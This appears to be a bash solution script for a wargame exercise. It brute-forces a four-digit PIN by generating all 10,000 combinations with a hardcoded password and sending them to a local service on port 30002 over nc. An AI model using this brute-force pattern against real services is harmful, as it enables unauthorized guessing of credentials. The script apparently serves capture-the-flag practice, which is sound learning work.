#!/bin/bash
host=localhost
port=30002
pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

## Clean up
#rm -v output.txt
rm -v template.txt
for i in {0000..9999}; do
  echo "Trying $i ..."
 # echo "$pass $i" | nc $host $port -w 1s >> output.txt
  echo "$pass $i" >> template.txt
done

nc $host $port < template.txt
